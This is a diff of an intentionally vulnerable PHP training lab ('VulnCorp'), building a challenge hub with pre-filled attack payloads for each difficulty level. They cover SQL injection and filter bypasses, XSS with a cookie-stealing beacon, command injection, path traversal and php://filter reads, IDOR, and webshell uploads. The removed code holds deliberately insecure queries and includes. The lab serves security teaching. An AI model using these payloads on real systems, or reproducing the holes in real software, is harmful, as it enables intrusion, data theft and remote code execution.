@@ -1,85 +1,188 @@
-<?php require __DIR__.'/header.php'; require __DIR__.'/levels.php'; $db = require __DIR__.'/db.php'; ?>
-<?php if (isset($_GET['reset'])): ?><div class="card" style="border-color:#2e9b4f">✅ Lab reset to a clean state (DB reseeded, guestbook &amp; uploads cleared).</div><?php endif; ?>
+<?php /* VulnCorp — interactive challenge hub (fill-and-run console). Targets the live pages. */ ?>
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>VulnCorp — Challenges</title>
+<style>
+:root{--bg:#0b0f16;--card:#0d1117;--card2:#161b22;--ink:#dfe6ee;--muted:#8b98a5;--line:#1c2330;--brand:#1f6feb;--ok:#2e9b4f}
+*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.5}
+.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#0e1726,#1f6feb);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 10px rgba(0,0,0,.4)}
+.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
+.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;text-decoration:none;font-size:.85em;background:rgba(255,255,255,.14);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.28)}
+.wrap{max-width:900px;margin:22px auto;padding:0 16px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
+.card h2{margin:0 0 8px;font-size:1.02em;color:#8ab4ff;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.card h2 code{background:#0b0f16;color:#9ce6a0;padding:2px 7px;border-radius:5px;font-size:.92em}
+.flag-pill{font-size:.7em;font-weight:600;background:#3a2d12;color:#ffd080;padding:2px 8px;border-radius:20px}
+details{margin:6px 0 10px}summary{cursor:pointer;color:var(--brand);font-size:.9em}
+details .pl{display:block;margin:8px 0;background:#05070b;color:#9ce6a0;padding:8px 10px;border-radius:6px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;white-space:pre-wrap;word-break:break-all}
+form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
+input[type=text],textarea{flex:1;min-width:200px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;background:#05070b;color:var(--ink);font-family:ui-monospace,Consolas,monospace;font-size:.9em}
+textarea{min-height:70px;width:100%}
+button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
+button.ghost{background:#1c2330;color:#8ab4ff}button:hover{filter:brightness(1.12)}
+.levels{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}.lvlbtn{background:#1c2330;color:#8b98a5;font-size:.8em;padding:4px 11px}
+.lvlbtn.on{background:#1f6feb;color:#fff}.note{color:var(--muted);font-size:.85em}
+.res{width:100%;height:200px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:none}
+.rx{white-space:pre-wrap;background:#05070b;color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:none;max-height:200px;overflow:auto}
+.muted{color:var(--muted);font-size:.92em}a{color:#8ab4ff}
+footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted);font-size:.85em;border-top:1px solid var(--line)}
+</style></head><body>
+<div class="topbar"><span class="brand">🛡 VulnCorp</span><span class="badge">app 1 · challenge hub</span>
+<nav class="nav"><a href="home.php">Home</a><a href="index.php">🎯 Hub</a><a href="progress.php">📊 Progress</a><a href="reset.php">↺ Reset</a><a href="feedback.php">💬 Feedback</a></nav></div>
+<div class="wrap">
+<div class="card"><h2>Challenge hub — fill &amp; run 🏁</h2>
+<p class="muted">Each card targets a live page. See the <b>vuln class</b>, work out the payload yourself; stuck?
+Click <b>💡 hint</b> → <b>use this</b> to drop it in the box → <b>Run</b> (the result loads right below). Full
+walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a href="home.php">Home</a>.</p></div>
 
-<div class="card">
-  <h2>Directory search</h2>
-  <form method="get">
-    <input name="q" placeholder="search a colleague (e.g. alice)" value="<?php echo f_xss($_GET['q'] ?? '', lvl()); /* reflected XSS (leveled) */ ?>">
-    <br><br><button>Search</button>
-  </form>
-<?php
-if (isset($_GET['q'])) {
-    $L = lvl();
-    $q = f_sqli($_GET['q'], $L);           // escalating input filter per level
-    $sql = "SELECT username, email, role FROM users WHERE username LIKE '%$q%'";
-    echo "<div class='muted' style='opacity:.55'>level: $L</div>";
-    try {
-        if ($L==='expert') {               // BLIND: reveal only match / no-match
-            $n=0; foreach ($db->query($sql) as $row) { $n++; }
-            echo "<div class='muted'>".($n>0?"✓ match":"✗ no match")." — blind, no data returned</div>";
-        } else {
-            foreach ($db->query($sql) as $row) {
-                echo "<div class='muted'>".$row['username']." &lt;".$row['email']."&gt; — ".$row['role']."</div>";
-            }
-        }
-    } catch (Exception $e) { echo "<div class='muted'>DB error: ".htmlspecialchars($e->getMessage())."</div>"; }
-}
-?>
+<!-- Login: SQLi bypass + weak creds -->
+<div class="card"><h2><code>login.php</code> <span class="flag-pill">🏁 SQLi auth-bypass</span> <span class="flag-pill">weak creds</span></h2>
+  <p class="muted">Log in without a password (inject), or with guessed creds.</p>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_lu">admin'-- -</code>
+    <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_lu').textContent;document.getElementById('in_lp').value='x'">use this ▶</button>
+    <span class="muted"> · or weak creds <code>admin : S3ntinel!Admin</code></span></details>
+  <form method="post" action="login.php" target="r_login" onsubmit="show('r_login')">
+    <input type="text" id="in_lu" name="username" placeholder="username" style="min-width:140px">
+    <input type="text" id="in_lp" name="password" placeholder="password" style="min-width:140px"><button>Login ▶</button></form>
+  <iframe name="r_login" id="r_login" class="res"></iframe></div>
+
+<!-- Search: UNION SQLi (leveled) -->
+<div class="card"><h2><code>index.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
+  <p class="muted">Directory search → dump the <code>users</code> table. The filter gets tougher each level.
+     <span class="note">(reflected XSS also lives here: <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>)</span></p>
+  <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_q"></span></summary>
+    <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use SQLi ▶</button>
+    <code class="pl" id="pl_qx"></code><button type="button" class="ghost" onclick="fill('in_q','pl_qx')">use XSS ▶</button></details>
+  <form method="get" action="home.php" target="r_q" onsubmit="show('r_q')">
+    <input type="hidden" name="level" id="lvl_q" value="easy">
+    <input type="text" id="in_q" name="q" placeholder="your SQLi payload…"><button>Run ▶</button></form>
+  <iframe name="r_q" id="r_q" class="res"></iframe></div>
+
+<!-- Guestbook: stored XSS (leveled) -->
+<div class="card"><h2><code>index.php</code> guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
+  <p class="muted">Post a comment; it's rendered to every visitor through the level's display filter. The page sets a non-HttpOnly <code>flag</code> cookie — swap <code>alert()</code> for a beacon (<code>new Image().src='http://127.0.0.1:9001/?c='+document.cookie</code>) to steal it.</p>
+  <div class="levels" id="lv_gb"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('gb','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('gb','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('gb','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('gb','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_gb"></span></summary>
+    <code class="pl" id="pl_gb"></code><button type="button" class="ghost" onclick="fill('in_gb','pl_gb')">use this ▶</button></details>
+  <form method="post" action="home.php" target="r_gb" onsubmit="show('r_gb')">
+    <input type="hidden" name="level" id="lvl_gb" value="easy">
+    <input type="text" name="author" placeholder="name" style="min-width:120px">
+    <input type="text" id="in_gb" name="body" placeholder="message / payload…"><button>Post ▶</button></form>
+  <iframe name="r_gb" id="r_gb" class="res"></iframe></div>
+
+<!-- Profile: IDOR (leveled) -->
+<div class="card"><h2><code>profile.php?id=</code> <span class="flag-pill">🏁 IDOR</span></h2>
+  <p class="muted">No ownership check. The id reference gets more obfuscated each level — all still forgeable. (1 = admin)</p>
+  <div class="levels" id="lv_id"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('id','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('id','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('id','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('id','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_id"></span></summary>
+    <code class="pl" id="pl_id"></code><button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button></details>
+  <form method="get" action="profile.php" target="r_id" onsubmit="show('r_id')">
+    <input type="hidden" name="level" id="lvl_id" value="easy">
+    <input type="text" id="in_id" name="id" placeholder="id (or encoded id)…" style="min-width:170px"><button>Run ▶</button></form>
+  <iframe name="r_id" id="r_id" class="res"></iframe></div>
+
+<!-- Net Tools: command injection (leveled) -->
+<div class="card"><h2><code>tools.php?host=</code> <span class="flag-pill">🏁 command injection</span></h2>
+  <p class="muted">The host is passed to a shell <code>ping</code>. Run your own command; the filter escalates.</p>
+  <div class="levels" id="lv_cmd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('cmd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('cmd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('cmd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('cmd','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_cmd"></span></summary>
+    <code class="pl" id="pl_cmd"></code><button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button></details>
+  <form method="get" action="tools.php" target="r_cmd" onsubmit="show('r_cmd')">
+    <input type="hidden" name="level" id="lvl_cmd" value="easy">
+    <input type="text" id="in_cmd" name="host" placeholder="host; command…"><button>Run ▶</button></form>
+  <iframe name="r_cmd" id="r_cmd" class="res"></iframe></div>
+
+<!-- Page: LFI (leveled) -->
+<div class="card"><h2><code>index.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
+  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates.</p>
+  <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
+    <code class="pl" id="pl_pg"></code><button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button></details>
+  <form method="get" action="home.php" target="r_pg" onsubmit="show('r_pg')">
+    <input type="hidden" name="level" id="lvl_pg" value="easy">
+    <input type="text" id="in_pg" name="page" placeholder="file path…"><button>Run ▶</button></form>
+  <iframe name="r_pg" id="r_pg" class="res"></iframe></div>
+
+<!-- Upload: webshell (leveled) -->
+<div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
+  <p class="muted">Upload a PHP webshell, then run commands. The file checks escalate each level (the content-type is sent as image/gif for you).</p>
+  <div class="levels" id="lv_up"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('up','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('up','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('up','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('up','expert')">Expert</button></div>
+  <input type="hidden" id="lvl_up" value="easy">
+  <p class="note" id="note_up"></p>
+  <label class="muted">1) shell code (pre-filled per level) &amp; name</label>
+  <textarea id="up_code"></textarea>
+  <form onsubmit="doUpload();return false"><input type="text" id="up_name" value="shell.php" style="min-width:120px"><button>Upload ▶</button></form>
+  <pre id="r_up" class="rx"></pre>
+  <label class="muted">2) run a command through uploads/shell.php</label>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_up">cat ../private/upload_flag.txt</code>
+    <button type="button" class="ghost" onclick="fill('in_up','pl_up')">use this ▶</button></details>
+  <form method="get" action="uploads/shell.php" target="r_upc" onsubmit="show('r_upc')">
+    <input type="text" id="in_up" name="cmd" placeholder="command… (e.g. id)"><button>Run ▶</button></form>
+  <iframe name="r_upc" id="r_upc" class="res"></iframe></div>
+
+<!-- Info disclosure -->
+<div class="card"><h2>Information disclosure <span class="flag-pill">🏁 config backup</span></h2>
+  <p class="muted"><code>robots.txt</code> maps the "hidden" paths; the <code>.bak</code> is served as plaintext.
+  (Open in a new tab — a browser hides <code>&lt;?php?&gt;</code>; use <b>View Source / Ctrl+U</b>.)</p>
+  <p><a href="robots.txt" target="_blank">/robots.txt</a> · <a href="config.php.bak" target="_blank">/config.php.bak</a>
+   · <a href=".well-known/security.txt" target="_blank">/.well-known/security.txt</a>
+   · <a href="private/deployment-notes.txt" target="_blank">/private/deployment-notes.txt</a></p></div>
+
+<!-- CSP -->
+<div class="card"><h2>Weak CSP <span class="flag-pill">analysis</span></h2>
+  <p class="muted">Read the policy and the cookie in the browser: <b>DevTools (F12) → Network</b> → reload →
+  click the document → <b>Response Headers</b> (the <code>Content-Security-Policy</code>), and
+  <b>Console</b> → <code>document.cookie</code> (the <code>flag</code> cookie — proves it's not HttpOnly).
+  <code>'unsafe-inline'</code> makes the stored-XSS cookie theft above work despite the CSP.</p></div>
+
 </div>
-
-<div class="card">
-  <h2>Guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
-  <details class="muted" style="margin-bottom:10px">
-    <summary style="cursor:pointer">💡 How to steal data with stored XSS (click)</summary>
-    <ol style="line-height:1.8">
-      <li>On Kali, start a listener: <code>python3 -m http.server 9001</code></li>
-      <li>Post this as the <b>message</b> (not the name — the name is escaped):<br>
-          <code>&lt;script&gt;new Image().src='http://127.0.0.1:9001/steal?c='+document.cookie&lt;/script&gt;</code></li>
-      <li><b>Reload this page</b> → your listener logs <code>GET /steal?c=flag=FLAG{...}</code>. That cookie is the flag (a real session in a live app).</li>
-    </ol>
-  </details>
-  <form method="post">
-    <input name="author" placeholder="name">
-    <br><br><textarea name="body" placeholder="leave a message"></textarea>
-    <br><br><button>Post</button>
-  </form>
-<?php
-if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['body'])) {
-    $st = $db->prepare("INSERT INTO comments(author,body,created) VALUES (?,?,NOW())");
-    $st->execute([$_POST['author'] ?? 'anon', $_POST['body']]);   // body stored raw
+<footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
+<script>
+function fill(inputId, plId){ document.getElementById(inputId).value = document.getElementById(plId).textContent; }
+function show(frameId){ document.getElementById(frameId).style.display='block'; }
+const PAYLOADS = {
+ q:{
+  easy:{p:"' UNION SELECT username,password,role FROM users-- -", n:"Easy — raw. Classic UNION dump."},
+  medium:{p:"' UNIunionON SELselectECT username,password,role FROM users-- -", n:"Medium — 'union'/'select' stripped once → nest them (UNIunionON)."},
+  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #."},
+  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match / no-match). Boolean-extract: ' AND SUBSTRING((SELECT v FROM secrets WHERE k='db_flag'),1,1)='F'-- -"}
+ },
+ cmd:{
+  easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — raw. Chain with ;"},
+  medium:{p:"127.0.0.1 | cat private/cmdi_flag.txt", n:"Medium — ; and & stripped → use a pipe |"},
+  hard:{p:"127.0.0.1$(cat${IFS}private/cmdi_flag.txt)", n:"Hard — ; & | ` and spaces stripped → $(...) with ${IFS}; the flag appears in the ping error."},
+  expert:{p:"127.0.0.1; cat private/cmdi_flag.txt > uploads/pwn.txt", n:"Expert — BLIND (no output). Write to a readable file, then open /uploads/pwn.txt in a new tab."}
+ },
+ pg:{
+  easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal."},
+  medium:{p:"....//....//lfi_secret/flag.txt", n:"Medium — '../' stripped once → ....// collapses back to ../"},
+  hard:{p:"....//....//lfi_secret/flag.txt", n:"Hard — + must end .txt/.html (this does) → same ....// trick."},
+  expert:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Expert — traversal blocked; use the php://filter wrapper, then base64-decode the output."}
+ }
+};
+PAYLOADS.q.easy.x='"><script>alert(1)<\/script>';
+PAYLOADS.q.medium.x='"><img src=x onerror=alert(1)>';
+PAYLOADS.q.hard.x='"><details open ontoggle=alert(1)>';
+PAYLOADS.q.expert.x='"><input autofocus onfocus=alert(1)>';
+PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload also stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle also stripped → autofocus+onfocus."}};
+PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"(id box ignored)",n:"Medium — id comes from the uid cookie. Set cookie uid=1 in DevTools, then Run."},hard:{p:"MQ==",n:"Hard — id is base64. MQ== = base64 of 1."},expert:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Expert — id is md5(real). This string is md5 of 1."}};
+PAYLOADS.up={easy:{p:"<?php system($_GET['cmd']); ?>",n:"Easy — no checks."},medium:{p:"<?php system($_GET['cmd']); ?>",n:"Medium — content-type must be image/* (sent as image/gif for you)."},hard:{p:"GIF89a<?php system($_GET['cmd']); ?>",n:"Hard — content must start with GIF89a magic bytes (prefixed)."},expert:{p:"GIF89a<?php passthru($_GET['cmd']); ?>",n:"Expert — the word 'system' is blocked → passthru()."}};
+function setLvl(card,lvl){
+  var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
+  var d=PAYLOADS[card][lvl];
+  if(card==='up'){ document.getElementById('up_code').value=d.p; }
+  else { var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p; }
+  var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
+  var plx=document.getElementById('pl_'+card+'x'); if(plx && d.x) plx.textContent=d.x;
+  document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
-foreach ($db->query("SELECT author, body, created FROM comments ORDER BY id DESC") as $c) {
-    // Stored XSS: body rendered through the level filter (easy = raw).
-    echo "<div class='card'><strong>".htmlspecialchars($c['author'])."</strong> <span class='muted'>".$c['created']."</span><br>".f_xss($c['body'], lvl())."</div>";
+['q','cmd','pg','gb','id','up'].forEach(function(c){ setLvl(c,'easy'); });
+function doUpload(){
+  var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
+  var lvl=(document.getElementById('lvl_up')||{}).value||'easy';
+  var name=document.getElementById('up_name').value||'shell.php';
+  var fd=new FormData(); fd.append('file', new Blob([document.getElementById('up_code').value],{type:'image/gif'}), name);
+  fetch('upload.php?level='+lvl,{method:'POST',body:fd}).then(r=>r.text()).then(t=>out.textContent=t.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim()).catch(e=>out.textContent='error: '+e);
 }
-?>
-</div>
-
-<div class="card">
-  <h2>Page <span class="flag-pill">🏁 path traversal / LFI</span></h2>
-  <details class="muted" style="margin-bottom:10px">
-    <summary style="cursor:pointer">💡 This card includes <code>pages/&lt;name&gt;</code> — escape it with <code>../</code> (click)</summary>
-    <ul style="line-height:1.8">
-      <li>Normal use: <code>?page=about.html</code></li>
-      <li>Traversal to the flag (outside the web root): <code>?page=../../lfi_secret/flag.txt</code> — only <b>2 ../</b> needed; extra <code>../</code> are harmless.</li>
-      <li>System file (bonus): <code>?page=../../../../../../../etc/passwd</code> — needs enough <code>../</code> to reach <code>/</code> for your install (depth varies).</li>
-    </ul>
-  </details>
-<?php
-  $L = lvl(); $raw = $_GET['page'] ?? 'home.html';
-  if (isset($_GET['page'])) echo "<div class='muted' style='opacity:.55'>level: $L</div>";
-  if ($L==='expert') {
-      // traversal blocked, but php:// wrappers allowed -> source disclosure via php://filter
-      if (preg_match('#^php://#i',$raw)) { @include($raw); }
-      else { @include(__DIR__.'/pages/'.str_replace('../','',$raw)); }
-  } elseif ($L==='hard') {
-      $p = f_lfi($raw,$L);                        // ../ stripped once
-      if (preg_match('/\.(html|txt)$/i',$p)) { @include(__DIR__.'/pages/'.$p); }
-      else { echo "<div class='muted'>only .html / .txt files allowed</div>"; }
-  } else {
-      @include(__DIR__.'/pages/'.f_lfi($raw,$L)); // easy raw; medium strips ../ once
-  }
-?>
-</div>
-
-<?php require __DIR__.'/footer.php';
+</script>
+</body></html>
